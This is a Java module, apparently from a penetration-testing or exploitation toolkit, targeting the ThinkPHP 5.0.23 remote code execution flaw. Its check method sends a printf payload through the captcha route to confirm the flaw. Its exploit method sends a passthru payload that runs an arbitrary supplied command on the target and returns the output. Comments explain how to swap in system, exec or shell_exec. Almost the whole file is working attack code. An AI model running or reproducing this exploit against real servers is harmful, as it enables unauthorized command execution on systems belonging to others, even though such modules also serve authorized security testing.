package Module;

import Framework.HTTPinterface;

/**
 * ThinkPHP5 5.0.23 远程代码执行漏洞
 *
 * ThinkPHP是一款运用极广的PHP开发框架。
 * 其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，
 * 导致攻击者可以调用Request类任意方法并构造利用链，
 * 从而导致远程代码执行漏洞。
 */

public class TP5_5023method_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.POST(url + "/index.php?s=captcha",
                    "_method=__construct&filter[]=printf&method=get&server[REQUEST_METHOD]=112233");
            if(result.contains("112233")){
                System.out.println(result);    //控制台调试语句
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            throw new RuntimeException();
        }
    }

    public static String exploit(String url,String cmd){
        try{
            //cmd=cmd.replace(" ","+");    //替换空格为加号，防止在拼接payload时出错，正常POST时无需使用
            String result = HTTPinterface.POST(url + "/index.php?s=captcha",
                    "_method=__construct&filter[]=passthru&method=get&server[REQUEST_METHOD]="+cmd);
            //如需修改命令执行函数，改写上面这行的passthru为需要的函数即可（如system/exec/shell_exec等）
            result = result.substring(0, result.indexOf("<!DOCTYPE html>"));    //去除多余输出，如果需要读取完整回显，注释该行即可
            System.out.println(result);    //控制台调试语句
            return result;
        }catch (Exception e){
            throw new RuntimeException();
        }
    }
}
